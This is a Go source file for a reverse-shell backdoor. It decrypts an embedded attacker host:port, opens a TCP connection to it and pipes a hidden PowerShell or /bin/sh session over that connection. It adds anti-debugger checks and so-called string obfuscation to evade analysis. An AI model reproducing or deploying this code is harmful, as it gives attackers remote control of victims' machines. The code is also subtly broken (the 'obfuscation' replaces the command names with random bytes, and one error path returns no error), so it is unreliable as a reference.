package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"io"
	"net"
	"os/exec"
	"runtime"
	"syscall"
	"time"
)

func decrypt(encrypted, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if len(encrypted) < aes.BlockSize {
		return nil, err
	}
	iv := encrypted[:aes.BlockSize]
	encrypted = encrypted[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(encrypted, encrypted)
	return encrypted, nil
}

func encrypt(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]

	nano := time.Now().UnixNano()
	binary.LittleEndian.PutUint64(iv, uint64(nano))

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
	return ciphertext, nil
}

func generateEncryptedHostPort(hostPort string, key []byte) string {
	encrypted, err := encrypt([]byte(hostPort), key)
	if err != nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(encrypted)
}

func main() {
	// Encrypted host and port
	encryptedHostPort := "9Fb+77zQKhgAAAAAAAAAANiJKrcD6IHOt8dNqu6FU9Oz"
	key, _ := base64.StdEncoding.DecodeString("Uan8HHVEHBHGxN2JS0WTWusBblTH9kJdhG+yuQTwRLg=")

	decodedHostPort, err := base64.StdEncoding.DecodeString(encryptedHostPort)
	if err != nil {
		return
	}

	hostPort, err := decrypt(decodedHostPort, key)
	if err != nil {
		return
	}

	hostPortStr := string(hostPort)

	conn, err := net.Dial("tcp", hostPortStr)
	if err != nil {
		return
	}
	defer conn.Close()

	//String obfuscation
	powershell := randomizeString("powershell.exe")
	command := randomizeString("-Command")
	noExit := randomizeString("-NoExit")
	sh := randomizeString("/bin/sh")
	interactive := randomizeString("-i")

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command(powershell, noExit, command, "-")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command(sh, interactive)
	}

	cmd.Stderr = cmd.Stdout

	pi, err := cmd.StdoutPipe()
	if err != nil {
		return
	}

	po, err := cmd.StdinPipe()
	if err != nil {
		return
	}

	err = cmd.Start()
	if err != nil {
		return
	}

	go func() {
		io.Copy(conn, pi)
	}()

	go func() {
		io.Copy(po, conn)
	}()

	cmd.Wait()
}

func init() {
	hostPort := "192.168.1.14:9001"
	key, _ := base64.StdEncoding.DecodeString("Uan8HHVEHBHGxN2JS0WTWusBblTH9kJdhG+yuQTwRLg=")

	encrypted := generateEncryptedHostPort(hostPort, key)
	println("Encrypted Host:Port: ", encrypted)
	println("\n--- Copy the Encrypted Host:Port above ---")
	println("\n--- Now update the main.go file with both values ---")

	time.Sleep(10 * time.Second)

	if isDebuggerPresent() {
		println("Debugger detected, exiting.")
		syscall.Exit(0)
	}
}

func isDebuggerPresent() bool {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		isDebuggerPresentProc := kernel32.NewProc("IsDebuggerPresent")
		ret, _, _ := isDebuggerPresentProc.Call()
		return ret != 0
	}
	return false
}

func randomizeBytes(data []byte) []byte {
	rand.Read(data)
	return data
}

func randomizeString(s string) string {
	b := []byte(s)
	b = randomizeBytes(b)
	return string(b)
}
